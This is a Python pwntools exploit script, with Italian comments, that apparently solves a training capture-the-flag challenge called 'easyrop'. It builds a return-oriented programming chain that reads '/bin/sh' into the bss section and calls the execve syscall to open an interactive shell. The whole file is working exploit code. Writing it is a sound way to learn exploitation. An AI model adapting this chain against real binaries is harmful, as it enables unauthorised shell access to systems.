from pwn import *
import time
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    p = process("./easyrop")
    gdb.attach(p, """
        #b *0x0040021f
        c
        """)
    input("wait")
else:
    p = remote("bin.training.offdef.it", 2015)

pop_rdi_rsi_rdx_rax=0x04001c2    #indirizzo del gadget in text
read=0x400144                    #indirizzo della read in text
binsh=0x600500                   #indirizzo bss in cui scriviamo /bin/sh\x00
syscall=0x0400168

def halfonstack(value):
    p.send(p32(value))
    p.send(p32(0))

def onstack(value):
    onehalf= value & 0xffffffff   #primi 32 bytes
    otherhalf= value >> 32

    halfonstack(onehalf)
    halfonstack(otherhalf)

chain=[0x13]*7  #array di 7 zeri
chain += [
    pop_rdi_rsi_rdx_rax,
    0,                     #rdi
    binsh,                 #rsi indirizzo del buffer in bss
    8,                     #rdx
    0,                     #rax
    read,
    pop_rdi_rsi_rdx_rax,
    binsh,
    0,
    0,
    0x3b,
    syscall                #indirizzo di una syscall
]

for i in chain:
     onstack(i)

p.send(b"\n") 
time.sleep(0.1)
p.send(b"\n")
time.sleep(0.1)

p.send(b"/bin/sh\x00")   #invio /bin/sh\x00 come parametro della read che ho creato con la chain e la salvo nel bss.

p.interactive()
